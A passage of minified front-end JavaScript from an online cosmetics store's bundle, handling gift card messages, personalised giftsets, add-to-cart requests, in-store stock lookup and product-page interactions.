e;e=Urls.getOutletFilterAvailability,$.when(b()).done((function(t){r.getJson({url:e,data:t,callback:function(e){$.each(e,(function(e,t){"object"===_typeof2(t)?$.each(t,(function(e,t){$('input[data-inputid="'+e+'"]').prop("disabled",!0!==t)})):$('input[data-inputid="'+e+'"]').prop("disabled",!0!==t)})),$(".js-filters-count").html(e.count)}})})),_()})),$(document).on("keyup",(function(e){27==e.which&&p.hasClass("refinements-visible")&&(u()?(h.animate({left:"0"},600,"easeInOutCubic"),f.hasClass("visible")?(f.removeClass("visible").attr("aria-hidden","true"),$(".filter-user-actions").css("left","100%")):p.addClass("moved-right").attr("aria-hidden","true"),$(".js-search-results-bar").find(".js-trigger-mobile-filters").focus(),setTimeout((function(){p.removeClass("refinements-visible").removeClass("moved-right").removeClass("moved-left"),A.removeClass("open"),f.removeClass("visible").attr("aria-hidden","true")}),800)):(p.removeClass("refinements-visible").attr("aria-hidden","true"),A.removeClass("open"),f.removeClass("visible").attr("aria-hidden","true"),$(".js-search-filter-box").find(".js-trigger-mobile-filters").focus()),d.enableScroll())})),w(),C(),x(),S(),$(window).on("resize",(function(){w(),C(),S()})),$(window).scroll((function(){x()}))})(),o.initGridOptionsEvents(),l.init()}},{"../grid":458,"../modules/ajax":470,"../modules/helpers/isInViewport":482,"../modules/helpers/isSmallView":487,"../modules/helpers/scroll":493,"../modules/util/appendParamsToUrl":497,"../modules/util/removeParamFromURL":522,"../product-tile":596,"./search":582}],561:[function(e,t,n){var r=e("../../genericFlyout"),i=e("../../write-a-card"),a=e("../../modules/ajax"),o=e("../../dragList");function s(e){e.error||(function(e){var t=$('[data-giftcard-uuid="'+e.UUID+'"]'),n=$(".js-giftcard-message",t),r=$("#GiftWrapText");r.length&&r.val(e.originalMessageText),e.giftCardMessage?n.length?n.html(e.giftCardMessage):n=$("<span />",{class:"bundle-pg-cart-excerpt js-giftcard-message"}).html(e.giftCardMessage).insertBefore($(l.reviewGiftCardButton,t)):n.remove()}(e),r.closeFlyouts())}var l={flyoutOptions:{open:function(){i.init(),o.init()}},editForm:".js-edit-gift-card",cancel:".js-cancel-giftcard-edit",reviewGiftCardButton:".js-gift-card-preview",init:function(){$(document).on("click.giftcard",l.reviewGiftCardButton,(function(e){e.preventDefault();var t={url:$(this).data("preview-url")};$.extend(t,l.flyoutOptions),r.load(t)})),$(document).off("submit.giftcard").on("submit.giftcard",l.editForm,(function(e){e.preventDefault();var t=$(this);a.postForm({form:t,handleJson:s})})),$(document).on("click.cancel",l.cancel,(function(e){e.preventDefault(),r.closeFlyouts()}))}};t.exports=l},{"../../dragList":434,"../../genericFlyout":449,"../../modules/ajax":470,"../../write-a-card":626}],562:[function(e,t,n){var r=e("../../rituals-styles"),i=e("../../modules/helpers/scroll"),a=".js-giftset-lightbox",o="[data-group-id] .js-edit-button",s=".js-undo-button",l=".js-giftset-lightbox-slider",c=".simplebar-content-wrapper",u=$(window).width()<768,d=$("#defaultImageData").val(),p={onChange:$.Event("pgCustomize.onChange")};function h(e){$.ajax({type:"GET",url:Urls.getTotalPriceForPGProduct,data:{pid:e},success:function(e){if(e){$(".js-total-pg-price").text(e.totalPriceDisplayValue);var t=$('input[name="pgProducts"]');if(0<t.length){var n=JSON.parse(t.val());n.products[0].price=e.totalPrice,t.val(JSON.stringify(n))}}}})}function f(e){$.ajax({type:"GET",url:Urls.getProductAvailabilityForPG,data:{pid:e},success:function(e){if(e){var t=$('input[name="pgProducts"]');if(0<t.length){var n=JSON.parse(t.val());n.products[0].availability=e.availability,t.val(JSON.stringify(n))}}}})}function A(){$(document).on("click",".js-lightbox-choose",(function(){var e=$(this),t=e.parents(a),n=t.data("lightboxgroup-id"),r=$('[data-group-id="'+n+'"] .js-edit-button');r.removeClass("animating");var o=e.closest(".js-lightbox-slider-item").data("choice-id");t.data("default-choice")===o?(r.nextAll(s).hide(),r.removeClass("repeat")):(r.nextAll(s).show(),r.addClass("repeat")),t.find(".selected").removeClass("selected"),e.addClass("selected"),$("#"+n).val(o),function(e,t){var n,r,i,a=(n=$('[data-choice-products-id="'+t+'"]',e).val(),r=JSON.parse(n),i=$("<div/>",{class:"list-holder js-lightbox-product-list-inner"}),$.each(r.productsList,(function(e,t){i.append($("<span/>",{html:t.title}))})),i);$('[data-group-id="'+e.data("lightboxgroup-id")+'"] .js-giftset-product-list').empty().append(a)}(t,o);var d=g();m(d),v($('[data-product-image-id="'+d+'"]').val()),y(d),u&&(t.removeClass("visible"),$("body").removeClass("visible-lightbox"),i.enableScroll(),$(l).scrollLeft(0),$(l).find(c).length&&$(l).find(c).scrollLeft(0)),h(d),f(d),$(document).trigger(p.onChange),$(".js-giftset-lightbox-close").trigger("click")}))}function m(e){var t=JSON.parse($('[data-product-image-id="'+e+'"]').val());t&&((new Image).src=t.largeImg)}function v(e){var t=JSON.parse(e);if(t){var n=$(".js-product-main-image");n.attr("src",t.largeImg),n.attr("title",t.title),t.srcset&&(n.attr("srcset",t.srcset),n.data("product-zoom",JSON.stringify({src:t.retinaImg,w:1e3,h:1e3})))}}function g(e){var t=e||$(".js-custom-giftset .js-group-result-product");if(!t.length)return"";var n=$("#available-final-productsets");if(!n.length)return"";var r=n.val().split(","),i=t.toArray().map((function(e){return e.value})),a=function(e){var t=i[e];if(1===(r=r.filter((function(e){return-1<e.indexOf(t)}))).length)return"break"};for(var o in i)if("break"===a(o))break;return r[0]}function y(e,t){t||(t=$('input[name="finalProductID"]')),t.val(e)}var b={init:function(){this.ensureFinalProductIdIsSet(),$(o).on("click",(function(){var e=$(this),t=e.closest("[data-group-id]").data("group-id"),n=$('.js-giftset-lightbox[data-lightboxgroup-id="'+t+'"]'),a=$(this).parent().prev(".js-group-result-product").val();e.addClass("animating"),$("body").addClass("visible-lightbox"),i.disableScroll(),n.addClass("visible");var o=$(".js-giftset-lightbox.visible");t=o.data("lightboxgroup-id");var s=$(".js-lightbox-slider-item",o).data("choice-id"),u=$('.js-lightbox-slider-item[data-choice-id="'+a+'"]',o),d=$(".js-custom-giftset .js-group-result-product").clone(),p=o.find(c);if(e.hasClass("reopened")){var h=u.position().left;o.find(l).scrollLeft(h),p.length&&p.scrollLeft(h)}else setTimeout((function(){e.addClass("reopened"),r.initLazyLoad(),d.each((function(e,n){var r=$(n);r.attr("id")===t&&r.val(s)})),m(g(d)),o.find(l).scrollLeft(0),p.length&&p.scrollLeft(0)}),200)})),$(document).on("click",".js-giftset-lightbox-close, .js-giftset-lightbox-overlay",(function(){$(this).parents(a).removeClass("visible"),$("body").removeClass("visible-lightbox"),i.enableScroll(),$(o).removeClass("animating"),$(l).scrollLeft(0),$(l).find(c).length&&$(l).find(c).scrollLeft(0)})),A(),$(document).on("click",".js-undo-button",(function(){var e=$(this),t=e.closest("[data-group-id]").data("group-id"),n=$('[data-lightboxgroup-id="'+t+'"]');$(".selected",n).removeClass("selected");var r,i,a=n.data("default-choice");$('[data-choice-id="'+a+'"] .js-lightbox-choose',n).addClass("selected"),e.prev().removeClass("repeat"),r=t,i=$('[data-lightboxgroup-id="'+r+'"] .js-default-products-list').html(),$('[data-group-id="'+r+'"] .js-giftset-product-list').html(i),v(d),$("#"+t).val(a);var o=g();y(o),e.hide(),h(o),f(o),$(document).trigger(p.onChange)}))},ensureFinalProductIdIsSet:function(e){var t=e?$('input[name="finalProductID"]',e):$('input[name="finalProductID"]');t.val()||y(g()||$("#final-productset-id").val(),t)}};t.exports=b},{"../../modules/helpers/scroll":493,"../../rituals-styles":608}],563:[function(e,t,n){var r=e("../../sectionScroller"),i=e("../../modules/util/isMobileOrTabletWidth"),a={customiseButton:$(".js-go-to-customise-set"),goToCardButton:$(".js-go-to-write-card"),editModeIndicator:$(".js-edit-mode-indicator"),readMoreLink:$(".js-read-more-link-pg"),init:function(){var e,t;(e=this).customiseButton.off("click.personalise").on("click.personalise",(function(e){e.preventDefault(),i()?r.scrollToCustom($(".js-custom-giftset")):r.scrollTo($(".js-custom-giftset"))})),e.goToCardButton.off("click.personalise").on("click.personalise",(function(){r.scrollTo($(".js-write-a-card-block"))})),e.readMoreLink.off("click.readmore").on("click.readmore",(function(){i()||r.scrollWithOffset($(".js-product-tabs"))})),(t=this).editModeIndicator.val()&&t.customiseButton.click()}};t.exports=a},{"../../modules/util/isMobileOrTabletWidth":515,"../../sectionScroller":611}],564:[function(e,t,n){var r=e("../../dialog"),i=e("../../modules/helpers/scroll"),a=$(".js-mobile-image-holder");function o(){$(".js-add-to-cart").click(),r.close()}var s={init:function(){$(document).on("click",".js-giftset-replace-accept",o),$(document).on("click.popup",".js-modal-overlay",(function(){r.close()})),$(document).on("click touchstart",".js-giftset-replace-close",".js-modal-overlay",(function(){r.close()})),$(document).off("click.pgsetexpand").on("click.pgsetexpand",".js-expand-pgset",(function(e){e.preventDefault();var t=$(this),n=t.closest(".js-cart-row").next().find(".js-pgset-container");t.toggleClass("expanded"),n.stop().slideToggle(500,(function(){n.attr("aria-hidden",!t.hasClass("expanded"))}))}))},showReplacePGDialog:function(){r.open({target:$("#giftset-replace-dialog"),options:{dialogClass:"popup-generic-holder",width:600,open:function(){$(".js-modal-overlay").show(),i.disableScrollEventsOnEl(".js-modal-overlay, .js-giftset-replace-dialog-wrapper, .ui-dialog-titlebar-close"),$('input[name="showReplacePGPopup"]').val("false")},close:function(){r.close(),i.enableScrollEventsOnEl(".js-modal-overlay, .js-giftset-replace-dialog-wrapper, .ui-dialog-titlebar-close"),$(".js-modal-overlay").hide(),$('input[name="showReplacePGPopup"]').val("true")}}})},handleMobileMinicartImage:function(e,t){var n=$('input[name="finalProductID"]',e);if(n.length&&n.val()){var r=$('[data-finalset-image="'+n.val()+'"]',t);r.length&&a.html(r)}}};t.exports=s},{"../../dialog":433,"../../modules/helpers/scroll":493}],565:[function(e,t,n){var r=e("../../page"),i=e("./giftCardUtils"),a=e("../../modules/google").tagManager,o={init:function(e){!function(e){e&&($(document).off("click.pgminicart"),$(document).on("click.pgminicart",".js-pg-minicart-remove",(function(t){t.preventDefault();var n=$(this);$.ajax({url:Urls.removeProductFromCart,type:"POST",data:{productId:n.data("product-id"),editMode:$(".js-edit-mode-indicator").val()||"Cart"===window.pageContext.type},dataType:"json"}).done((function(t){if(t.success){if(t.reload)return void r.refresh();n.parents(".mini-cart-product").remove(),e.updateProductsAndPrice(t.totalPrice,t.numberOfProducts,0),e.updateHeaderCartIcon(t.numberOfProducts),0===t.numberOfProducts&&e.switchToEmptyCart();var i=n.data("data-layer-products");i&&a.updateQuantity("cart",null,null,i,null,1,"removeFromCart")}})).fail((function(){window.alert(Resources.BAD_RESPONSE)}))})))}(e),i.init()}};t.exports=o},{"../../modules/google":474,"../../page":534,"./giftCardUtils":561}],566:[function(e,t,n){var r=e("../../page"),i=e("../../navigation"),a=e("../../modules/util/ajaxUrl"),o=e("promise"),s=e("../../bonus-products-view"),l=e("../../certificate-view"),c=e("../../modules/google").tagManager,u=e("../../dialog"),d=e("../../modules/helpers/scroll"),p=e("../product/outOfStock"),h=e("../personalisedgifting/lightbox"),f=e("../personalisedgifting/pgCartUtils"),A=e("./variations");function m(e,t){var n=$($.parseHTML(e)).find(".bonus-item-actions a.js-select-bonus-product").first(),r=null,i=!1;n&&0<n.length&&(r=n.attr("href"),i=n.data("showadded"));var a="true"===$(e).find("input[name=DisplayGwpToast]").val(),o="true"===$(e).find("input[name=ShowToastNotificationOnFirstAdd]").val();s.show({url:r,giftChange:!1,response:e,isAddedPopup:i,displayGwpToast:a||o},t)}var v=function(e){e.preventDefault();var t=$("input[id$=Quantity]"),n=1*t.val();t.val("-"!=$(this).attr("data-count")?n<999?n+1:999:1<n?n-1:1)},g=function(e){e.preventDefault();var t=$("input[id$=Quantity]"),n=t.val();isNaN(n)||n<0?t.val(1):999<=parseInt(n)&&t.val(999)},y=function(e){var t=$(this);e.preventDefault(),e.stopPropagation(),u.open({url:t.attr("href")||t.data("href"),source:"quickview",target:$(".js-popup-generic"),options:{closeOnEscape:!0,dialogClass:"popup-generic-holder",width:"640",autoOpen:!0,create:function(){d.disableScroll(),$(".js-modal-overlay").show(),$("body").on("click touchstart",".js-modal-overlay",(function(){u.close()}))},beforeClose:function(){d.enableScroll(),$(".js-modal-overlay").hide(),$(".js-popup-generic").empty()},position:{my:"center",at:"center",of:window,collision:"flipfit"}}}),d.disableScroll(),$(".js-modal-overlay").show(),$(".popup-generic-holder").focus()};t.exports={init:function(){p.init(),f.init(),$(".js-add-to-cart[disabled]").attr("title",$(".availability-msg").text()),$(document).on("click",".js-add-to-cart, .js-add-to-cart-quickview",(function(e,t){var n,u=$(e.target);if(u.hasClass("js-variations-add-to-cart")){if(!A.validateVariations(e))return;!function(){var e=$(".product-add-to-cart").find('input[name="analyticsData"]').attr("value");if(e){var t=JSON.parse(e);t.event_label=$(".js-the-ritual-of-title").first().text().trim(),c.pushDataLayerEvent(t)}}()}if(!t&&u.hasClass("js-add-to-cart-talisman"))return(n=e).preventDefault(),n.stopPropagation(),void l.show({addToCartButton:n.target});document.querySelector(".js-advent-block")&&function(e){var t=$(e).closest("form");h.ensureFinalProductIdIsSet(t);var n=t[0][6].defaultValue,r=JSON.parse(n),i=$(e).closest(".advent-comparison-item")[0];i&&c.pushDataLayerEvent({event:"advent",ecommerce:{currencyCode:i.attributes["data-currency-code"].value,add:{products:[{name:r.name,id:r.sku,price:i.attributes["data-product-price"].value}]}}})}(e.target),function(e){e.preventDefault(),e.stopPropagation();var t=$(e.target),n=t.closest("form");h.ensureFinalProductIdIsSet(n);var l,u,d,p,A,v,g,y,b,_,w,C={isQuickView:t.hasClass("js-add-to-cart-quickview"),eventName:t.data("addtocart-event")};(l=n,u=C,d=$(l),p=d.find('input[name="Quantity"]'),A=d.find('input[name="pid"]'),v=A.data("bundled-products"),g=$(".pdp-elixir-item option:selected:eq(0)").data("elixir-product"),y=$(".pdp-elixir-item option:selected:eq(1)").data("elixir-product"),b=g&&y?{products:[g,y]}:null,_=0<d.find('input[name="dataLayerProduct"]').length?JSON.parse(d.find('input[name="dataLayerProduct"]').val()):null,w=null,0<d.find('input[name="horProducts"]').length?w=JSON.parse(d.find('input[name="horProducts"]').val()):0<d.find('input[name="pgProducts"]').length&&(w=JSON.parse(d.find('input[name="pgProducts"]').val())),0===p.length||isNaN(p.val())||0===parseInt(p.val(),10)||p.val()<0?(0===p.length&&(p=$('<input type="hidden" name="Quantity"/>')),p.val("1")):999<parseInt(p.val())&&p.val(999),o.resolve($.ajax({type:"POST",url:a(Urls.addProduct),data:d.serialize()})).then((function(e){if(e.error)throw new Error(e.error);if(e.replaceGiftSet)return f.showReplacePGDialog(),!1;if(u&&u.eventName){var t=d.closest(".product-list-slider-item").data("counter"),n=d.closest("section.product-list-slider-block").data("sliderid");c.updateQuantity("products",A.val(),v,w,b,parseInt(p.val(),10),u.eventName,_,t,n),u.isQuickView&&$(".js-popup-generic").dialog("close")}return e}))).then(function(e){if(e){var a=n.find('input[name="uuid"]');if(0<a.length&&0<a.val().length||"Cart"===pageContext.type)r.refresh();else{var o=0<t.closest(".js-sticky-add-to-cart").length,l=n.find('input[name="thumbnailImage"]');l.length?$(".js-product-image-mobile").attr("data-src",l.val()):f.handleMobileMinicartImage(n,e);var c=$(".js-refill-mobile-data");if(c&&c.length){c.addClass("hide");var u=n.find('input[name="isRefilProduct"]');u&&u.length&&"true"==u.val()&&c.removeClass("hide")}var d,p,h,A,v,g,y=$(e).find(".js-minicart-discount-data");y.length?(p=y.data("added-product-id"),h=e,A=o,v=(d=y).data("choice-discount-url"),g=d.data("choice-selected-product").toString(),s.show({url:v,giftChange:!0,response:!0,selectedID:g,addedProductId:p,onClose:function(){m(h,A)}})):m(e,o),i.initNavigationToMainSite(),i.updateNavigationLinksOnAddToCart(!1),$(".js-sticky-add-to-cart").length&&o&&($(".js-sticky-add-to-cart .js-add-to-cart").addClass("checked"),setTimeout((function(){$(".js-sticky-add-to-cart .js-add-to-cart").removeClass("checked")}),4e3))}}}.bind(this))}(e)})),$(document).on("click",".js-quantity-button",v),$(document).on("blur","input[id$=Quantity]",g),$(document).on("click",".js-open-quickview",y)},updateMiniCartOnAddProduct:m}},{"../../bonus-products-view":293,"../../certificate-view":297,"../../dialog":433,"../../modules/google":474,"../../modules/helpers/scroll":493,"../../modules/util/ajaxUrl":495,"../../navigation":532,"../../page":534,"../personalisedgifting/lightbox":562,"../personalisedgifting/pgCartUtils":564,"../product/outOfStock":571,"./variations":577,promise:230}],567:[function(e,t,n){var r=e("../../modules/google"),i=e("../../modules/helpers/isSmallView"),a={variationProductID:null,latitude:null,longitude:null};function o(){$(".js-spinner").addClass("spinner-visible"),p(),r.places.getCurrentLocation(c)}function s(){r.tagManager.pushEnterZipCode();var e=this.getPlace();e&&e.geometry&&e.geometry.location&&($(".js-spinner").addClass("spinner-visible"),a.latitude=e.geometry.location.lat(),a.longitude=e.geometry.location.lng(),p(),h(0))}function l(e,t){if($(".js-spinner").addClass("spinner-visible"),"OK"==t){var n=e[0];a.latitude=n.geometry.location.lat(),a.longitude=n.geometry.location.lng(),d(n.formatted_address),p(),h(0)}}function c(e,t,n){if(e&&t&&n)d(r.places.getReadableAddress(e)),a.latitude=t,a.longitude=n,p(),h(0);else{var i=$("[name=RequestLatitude]")[0].value,o=$("[name=RequestLongitude]")[0].value;i&&o?r.places.getLocationFromLatLong(i,o,u):$(".js-location-not-found").show()}}function u(e,t,n){e&&t&&n?(d(r.places.getReadableAddress(e)),a.latitude=t,a.longitude=n,p(),h(0)):$(".js-location-not-found").show()}function d(e){$(".js-check-instore-availabilty-zipcode-textfield").val(e),$(".js-check-instore-availabilty-zipcode-textfield").trigger("change")}function p(){$(".js-location-not-found").hide(),$(".js-size-not-selected").hide(),$(".show-more-btn").hide(),$(".stores-list-wrapper .js-list-row").remove(),$(".stores-list-wrapper .error").remove(),$("[name=NextPageToken]").remove()}function h(e){var t=$(".js-size-not-selected");$(".js-location-not-found").hide(),$(".show-more-btn").hide().addClass("js-hidden-show-more"),t.hide(),0===$(".flyout-variations li.selectable").length||0!==$("li.selected .js-swatch-anchor-flyout").length?e<25&&$.ajax({url:Urls.getInStoreAvailability,data:{productId:function(){if(a.variationProductID)return a.variationProductID;var e=$("[name=pid]")[0];return e.dataset.retailtu?e.dataset.retailtu:e.value}(),latitude:a.latitude,longitude:a.longitude,nextPageToken:e}}).done((function(t){var n=$(t);0!=t.length&&($(".stores-list-wrapper .error").remove(),$(".js-stores-list-header").addClass("show-header")),0==e&&p(),$(".js-stores-list-wrapper").append(n),0<$("[name=NextPageToken]").last().val().length&&$("[name=NextPageToken]").last().val()<25&&$(".show-more-btn").show().removeClass("js-hidden-show-more"),$(".js-spinner").removeClass("spinner-visible"),i()||$(".js-stores-list-wrapper .js-expand-row-btn").first().find(".store-main-info").click(),0<e&&n.find(".js-list-row:first-child").focus()})):($(".js-spinner").removeClass("spinner-visible"),t.show()),$(document).on("keydown",".wrap-details:last-child .js-list-row:last-child",(function(e){9!=e.which||e.shiftKey||$(".show-more-btn").hasClass("js-hidden-show-more")&&(e.preventDefault(),$(".js-instore-availability-flyout").find(".js-close-flyout").focus())}))}t.exports=function(){$("body").on("click",".js-check-instore-availabilty-current-location",o),$("body").on("keyup",".js-check-instore-availabilty-wrapper",(function(e){13==e.which&&o()})),$(".js-show-more-btn").on("click",(function(){$(".js-spinner").addClass("spinner-visible"),h($("[name=NextPageToken]").last().val()||0)})),$(".js-swatch-anchor-flyout").on("click",(function(e){var t,n;if($(".js-spinner").addClass("spinner-visible"),t=this.innerText,$(".js-swatch-anchor").each((function(){if(this.innerText==t){if($(this).hasClass("js-swatch-unselectable"))return;if($(this).parent("li").hasClass("selected"))return;$(this).click()}})),e.preventDefault(),e.stopPropagation(),n=$(this),$(".js-swatch-anchor-flyout").each((function(){$(this).parent("li").removeClass("selected")})),n.parent("li").addClass("selected"),!a.longitude||!a.latitude)return p(),void r.places.getCurrentLocation(c);a.variationProductID=$(this).data("productid"),p(),h(0)})),r.places.initStockFlyout(s)},t.exports.refreshFlyout=function(){if(!a.longitude||!a.latitude){p();var e=$("[name=CurrentUserShortAddress]")[0].value;""!==e&&r.places.searchPlace(e,l)}}},{"../../modules/google":474,"../../modules/helpers/isSmallView":487}],568:[function(e,t,n){var r=e("../../flyout"),i=e("./stickyaddtocart"),a=e("./outOfStock"),o=e("./ingredient"),s=e("./pdp-animations"),l=e("./option"),c=e("../../product-tile"),u=e("../../video"),d=e("../personalisedgifting/personalise"),p=e("../personalisedgifting/lightbox"),h=e("../../write-a-card"),f=e("./variations"),A=e("../../modules/helpers/isSmallView"),m=e("../../easter/easter"),v=e("../../modules/google").tagManager,g=e("../../advent"),y=$(".js-pdp-main").hasClass("giftset-pdp-main-container"),b=e("../../minicart");function _(){$(window).off("beforeunload.product")}var w={init:function(){var e,t;$(document).on("click",".js-check-instore-availabilty",(function(){var e=$(this);r.openInStoreAvailabilityFlyout(e.hasClass("js-amsterdam-availabilty")),$(this).addClass("js-flyout-opened"),g.pushAdventDataLayerDataWithActiveProductImageSlide("instore availability")})),$(document).on("click",".js-check-instore-availabilty-hor",(function(){var e=$(this);r.openInStoreAvailabilityHORFlyout(e.hasClass("js-amsterdam-availabilty")),$(this).addClass("js-flyout-opened")})),$(document).on("click",".js-read-more-link",(function(){var e=$(".js-product-tabs"),t=$(".js-header").height(),n=$(".js-description-acc-head"),r=$(".js-description-tab");!function(e){if(e&&e.length){var t=e.data("analytics");t&&(t.content_name=decodeURI(t.content_name),t.click_target=decodeURI(t.click_target),v.pushDataLayerEvent(t))}}($(this)),$("html,body").animate({scrollTop:e.offset().top-t},1e3),A()?n.hasClass("open")||setTimeout((function(){n.trigger("click",[!0]).focus()}),600):r.hasClass("selected")||setTimeout((function(){r.trigger("click",[!0]).focus()}),600)})),"gst_talisman"===new URL(window.location.href).searchParams.get("origin")&&v.pushDataLayerEvent({origin:"gst_talisman"}),$(document).on("recommendation-grid-loaded.pdp",(function(){var e;e=$("[id^=cq_recomm] .js-product-tile-datalayer-product"),$.each(e,(function(e,t){var n=JSON.parse(t.value);n.list="product detail page",t.value=JSON.stringify(n)}))})),y&&($(document).on("pgCustomize.onChange",(function(){""!=$(".js-card-message-textarea").val()||0<$(".js-undo-button:visible").length?$(window).off("beforeunload.product").on("beforeunload.product",(function(){return!0})):_()})),$(document).on("pgCustomize.onSubmit",(function(){_()}))),$("body").on("click",".js-pdp-back",(function(){var e=$(this).data("url");if(e){var t=document.referrer;if(""===t||-1===t.indexOf("rituals")||-1<t.indexOf("login")||-1===t.indexOf("outlet"))return void(window.location=e)}var n=$(this).closest(".js-easter-pdp");n&&n.length&&(m.pushEvent("back"),$(this).hasClass("js-breadcrumbs-easter"))?$(document).trigger($.Event("easter.startCloseAnimation")):window.history.back()})),c.init(),i.init(),a.init(),o.init(),u.initPDP(),d.init(),p.init(),h.init(),f.initEvents(),b.updateHeaderCartIcon(),(e=localStorage.potentialNewTabProducts?JSON.parse(localStorage.potentialNewTabProducts):{})[t=($('input[name="masterPid"]').val()||$('input[name="pid"]').val()||"").replace(/[^0-9]/,"")]&&window.history.length<=1&&v.pushProductTileClickNewTab(e[t]),delete e[t],localStorage.potentialNewTabProducts=JSON.stringify(e)},initOnDomReady:function(){s.init()},initializeQuickviewEvents:function(){l()}};t.exports=w},{"../../advent":286,"../../easter/easter":435,"../../flyout":447,"../../minicart":467,"../../modules/google":474,"../../modules/helpers/isSmallView":487,"../../product-tile":596,"../../video":625,"../../write-a-card":626,"../personalisedgifting/lightbox":562,"../personalisedgifting/personalise":563,"./ingredient":569,"./option":570,"./outOfStock":571,"./pdp-animations":572,"./stickyaddtocart":574,"./variations":577}],569:[function(e,t,n){var r=e("../../modules/helpers/isSmallView");var i={init:function(){$(document).ready((function(){$(document).on("click",".js-expand-ingredients",(function(){var e=$(this).parents(".column-details");e.hasClass("open")?(e.removeClass("open"),$(this).siblings(".ingredient-item").not(":first").stop().slideUp(400),$(window).width()<768&&$("html, body").animate({scrollTop:e.offset().top-90},400)):(e.addClass("open"),$(this).siblings(".ingredient-item").stop().show())})),$(document).on("click",".js-scroll-ingredients",(function(){var e=$(".js-ingredients-tab"),t=$(".js-ingredients-acc-head");r()?($("html, body").animate({scrollTop:$(".js-product-tabs").offset().top-60},600),t.hasClass("open")||setTimeout((function(){t.click().focus()}),300)):($("html, body").animate({scrollTop:e.offset().top-60},600),e.hasClass("selected")||setTimeout((function(){e.click().focus()}),600))}))}))}};t.exports=i},{"../../modules/helpers/isSmallView":487}],570:[function(e,t,n){var r=e("../../modules/util/isMobile"),i=!1,a=function(e,t){e.find(".disabled-selected").removeClass("disabled-selected").removeAttr("disabled"),e.find('[value="'+t+'"]').addClass("disabled-selected").attr("disabled",!0),e.selectric("refresh")},o=function(e){var t=e.parent("li"),n=t.attr("value");t.parent("ul").find("li").each((function(){$(this).removeClass("selected")})),t.addClass("selected"),0<$(".quickview-popup").length?($(".quickview-popup .js-options-hidden-input").val(n),$(".quickview-popup .js-disabled-add-to-cart").hide(),$(".quickview-popup .js-add-to-cart").show()):($(".js-options-hidden-input").val(n),$(".js-options-dropdown").hide(),$(".js-disabled-add-to-cart").hide(),$(".js-add-to-cart").show())},s=function(){$(".js-product-details-content .js-add-to-cart").removeClass("btn--disabled").show(),$(".js-sticky-add-to-cart-form .js-disabled-add-to-cart").hide(),$(".js-sticky-add-to-cart-form .js-add-to-cart").show().removeClass("btn--disabled"),l(!0)};function l(e){var t=$(".js-product-details-content .js-social-commerce-button");t&&t.length&&(e?t.parent().removeClass("hide"):t.parent().addClass("hide"))}var c=function(){$(".js-product-details-content .js-add-to-cart").addClass("btn--disabled"),$(".js-sticky-add-to-cart-form .js-disabled-add-to-cart").show(),$(".js-sticky-add-to-cart-form .js-add-to-cart").hide().addClass("btn--disabled"),l()},u=function(e){e.attr("disabled",!0),$(".js-product-details-content .js-add-to-cart").addClass("btn--disabled").show(),$(".js-sticky-add-to-cart-form .js-disabled-add-to-cart").hide(),$(".js-sticky-add-to-cart-form .js-add-to-cart").addClass("btn--disabled").show(),l()},d=function(){return 0<$(".js-product-details-content option.js-out-of-stock-option:selected").length},p=function(e,t){e.valid()&&t.checkForm()?s():c()},h=function(e){var t=e.parent("li").data("formattedvalue");$(".js-sticky-price-container").empty().append('<div class="product-price">'+t+"</div>")};function f(){if(!i){i=!0;var e=history.state||{};e.hairtemple=!0,history.replaceState(e,"",location.href)}}t.exports=function(){!function(){var e,t=$('.js-out-of-stock-btn[data-sticky-type="elixir"]'),n=$(".js-product-details-content .js-options-dropdown-custom");t.length&&!t.attr("style")&&($(".js-sticky-add-to-cart").hide(),$(".js-product-details-content .js-personalized-name").attr("disabled",!0)),function(){if(history.state&&history.state.hairtemple&&window.performance&&window.performance.navigation.type==window.performance.navigation.TYPE_BACK_FORWARD){if(d())return u($(".js-product-details-content .js-personalized-name"));if($(".js-product-details-content form").valid())return s();c()}}(),(e=n).each((function(){var t=$(this),n=t.val(),r=jQuery.grep(e,(function(e){return e.name!==t.attr("name")}));a($(r),n)})),$("body").on("click",".js-swatch-anchor-option",(function(e){e.preventDefault(),$(this).hasClass("swatch__anchor--unselectable")||(o($(this)),0<$(".js-sticky-add-to-cart").length&&h($(this)))})),$(document).on("click",".js-sticky-add-to-cart .js-pdp-select-size-btn, .js-sticky-add-to-cart .js-select-elixir",(function(){var e=r()?$(".js-product-details-content").offset().top:0;$("html, body").animate({scrollTop:e},"slow")})),$("body").on("change",".js-options-dropdown",(function(){var e=$(this),t=$('ul[data-optionid="'+e.data("optionid")+'"]').find("li[value="+e.val()+"] a");o(t),h(t)})),$("body").on("change",".js-product-details-content .js-options-dropdown-custom",(function(){var e=$(this),t=e.parents("form"),n=$(t).validate(),r=t.find(".js-options-dropdown-custom"),i=t.find(".js-personalized-name"),o=e.val(),s=jQuery.grep(r,(function(t){return t.name!==e.attr("name")}));if(a($(s),o),d(r))return n.resetForm(),void u(i);i.removeAttr("disabled"),p(e,n)})),$("body").on("input",".js-product-details-content .js-personalized-name",(function(){var e=$(this),t=e.nextAll(".js-charnumber"),n=parseInt(e.attr("maxlength"),10)-e.val().length;t.text(n<0?0:n),p(e,e.parents("form").validate())})),$("body").on("click",".js-product-details-content .js-add-to-cart",(function(e){var t=$(this);if(t.parents("form").valid())return t.removeClass("btn--disabled"),!0;t.addClass("btn--disabled"),e.preventDefault(),e.stopPropagation()})),($(".js-options-dropdown-custom").length||$(".js-personalized-name").length)&&($(window).on("beforeunload",f),$(window).on("unload",f),$(document).on("pagehide",f))}()}},{"../../modules/util/isMobile":514}],571:[function(e,t,n){var r,i=e("../../modules/util/removeDuplicatesFromArray"),a=e("../../modules/util/ajaxUrl"),o=e("../../modules/ajax"),s=e("../../rituals-styles"),l=e("promise"),c=e("../../flyout"),u=e("../../rituals-form-helper"),d=window.Resources||{},p=e("../../dam/dam-helper");function h(e){e&&($(".js-alt-stock-notification-flyout").empty(),o.load({url:Urls.getStockNotificationBar,data:{pid:e,source:"showbar"},target:$(".js-alt-stock-notification-flyout"),callback:function(){setTimeout((function(){f()}),10),s.initInputStyles()}}))}function f(){$(".js-generic-flyout").addClass("flyout-out-of-stock");var e=$(".js-out-of-stock-wrapper").html(),t={open:function(){u.init()}};c.loadFromHtml(e,t),p.updateImages($(".js-flyout-out-of-stock")),window.clearTimeout(r)}function A(e){e.preventDefault();var t=$(this).parent().find(".js-stock-notification-email"),n=t.val();if(t.valid()&&n){var i=$("input#hdn_product_id").val(),o=$(".js-stock-notification-submit-btn");o.addClass("button-loading"),o.find(".js-spinner-general").addClass("spinner-visible"),l.resolve($.ajax({type:"POST",url:a(Urls.requestStockNotification),contentType:"application/json",dataType:"html",data:JSON.stringify({email:n,productId:i})})).then((function(e){var 